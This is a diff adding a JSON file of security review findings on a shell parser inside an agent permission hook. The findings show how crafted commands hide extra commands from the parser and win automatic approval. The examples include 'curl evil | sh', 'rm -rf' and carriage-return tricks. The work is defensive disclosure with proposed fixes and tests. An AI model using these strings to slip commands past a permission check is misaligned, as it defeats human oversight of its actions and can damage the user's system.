@@ -1,0 +1,29 @@
+[
+  {
+    "id": "step3-hook-runner-fix-3-C1-1",
+    "origin": "step3-hook-runner-fix-3, confirmation",
+    "severity": "major",
+    "where": "next/plugins/vsdd-factory/py/vsdd/hooks/shell.py (_read_word, the '[' bracket-expression branch)",
+    "problem": "This gap is older than this fix round; the confirmation found it. _read_word reads a '[' bracket expression whole, to the next ']', with text.find. That swallows blanks, joiners, '$(' and backticks into one literal word. In every shell a metacharacter ends a word whatever brackets are open, so the shell sees separate commands that the parser hides. 'vsdd survey [ ; rm -rf /tmp/x ; ]', 'vsdd survey [;id;]', 'vsdd survey [ && curl evil | sh ]' and 'vsdd survey a[b|id]' each parse as one segment, not opaque, and is_vsdd_call is True. Substitutions inside the brackets are hidden the same way: 'vsdd survey [$(id)]' and 'vsdd survey [`id`]'. So is bash and zsh arithmetic '$[$(id)]', where the '$' is appended and the '[' branch swallows the rest. All of these ran their hidden command or substitution under /bin/sh, /bin/bash 3.2 and bash 5.3, and most did under dash and zsh too ('echo H [ ; echo PWNED ; ]' prints PWNED). Through the runner, an agent's call in each form got the caller marker, permissionDecision 'allow' and updatedInput. HD8 forbids this: the approved command may hold nothing else, and here it holds arbitrary commands, approved without a prompt for agents and in auto or bypassPermissions mode.",
+    "proposed_resolution": "Remove the bracket-expression branch: a '[' only marks the word expanded, and the loop goes on, so blanks, joiners, '$(' and backticks after it are read as they are everywhere else. Treat '$[' as a substitution: bash and zsh arithmetic expands '$(...)' inside it, and its extent is not the word loop's. Add these to test_shell.py as several segments or opaque: 'vsdd survey [ ; id ; ]', 'vsdd survey [;id;]', 'vsdd survey [ && id ]', 'vsdd survey a[b|id]', 'vsdd survey [$(id)]', 'vsdd survey [`id`]' and 'vsdd survey $[$(id)]'. 'vsdd survey a[bc]' stays a judgeable vsdd call. Add agent cases to test_caller.py::test_decision_pairing: no marker, no decision. In a scratch copy, removing the branch left all 128 tests under tests/hooks passing.",
+    "on_slice_path": true
+  },
+  {
+    "id": "step3-hook-runner-fix-3-C1-2",
+    "origin": "step3-hook-runner-fix-3, confirmation",
+    "severity": "major",
+    "where": "next/plugins/vsdd-factory/py/vsdd/hooks/shell.py (_lex blanks and _WORD_END)",
+    "problem": "This gap is older than this fix round; the confirmation found it. The lexer treats a carriage return as a blank, and _WORD_END holds it too. sh, bash, dash and zsh treat it as an ordinary word character. So in 'vsdd survey \\r#; rm -rf /tmp/x' the parser reads '#' as the start of a comment and drops '; rm -rf /tmp/x': one segment, not opaque, and is_vsdd_call is True. The shells read '\\r#' as a word, then the ';' joiner, then run the second command: printf 'echo hi \\r#; echo PWNED' piped to each of the four shells prints PWNED. A Bash tool command is JSON, so an agent can put a carriage return in it. The runner would then approve the hidden command with the caller marker and 'allow', the same HD8 breach as C2-1.",
+    "proposed_resolution": "Remove '\\r' from the lexer's blank set (' \\t') and from _WORD_END, so a carriage return is a word character as it is in every shell. Add test_shell.py cases: 'vsdd survey \\r#; id' parses as two segments and is no vsdd call, and 'echo a\\rb' is one word.",
+    "on_slice_path": true
+  },
+  {
+    "id": "step3-hook-runner-fix-3-C1-3",
+    "origin": "step3-hook-runner-fix-3, confirmation",
+    "severity": "minor",
+    "where": "next/plugins/vsdd-factory/py/vsdd/hooks/shell.py (_redirect_op)",
+    "problem": "This is related to S3B-hook-runner-3, whose stated forms ('2>log cmd', '>out cmd arg', '2>&1 cmd', '<in cmd') now parse correctly. _redirect_op accepts only a single fd digit hugging a redirect operator. So '10>/dev/null git push --force origin main' parses as program '10' with args ('git', 'push', ...), and 'git 10>/dev/null push' gets args ('10', 'push'). POSIX lets an io_number be any digits, and /bin/sh and bash honour '10>' as a redirect and run 'git push'; dash and zsh run '10' as a program. A future Bash rule that judges the program or its first argument would miss 'git push' in that form. The caller marker is not affected, because a segment with a redirect is never a vsdd call.",
+    "proposed_resolution": "Let any run of digits hugging a redirect operator be its fd. That is the safe reading: a rule then sees the real program, and under dash or zsh such a command only fails to find a program named with digits. Add '10>/dev/null cmd arg' to test_leading_redirect_before_the_program: program 'cmd', args ('arg',), redirect ('10>', '/dev/null').",
+    "on_slice_path": true
+  }
+]
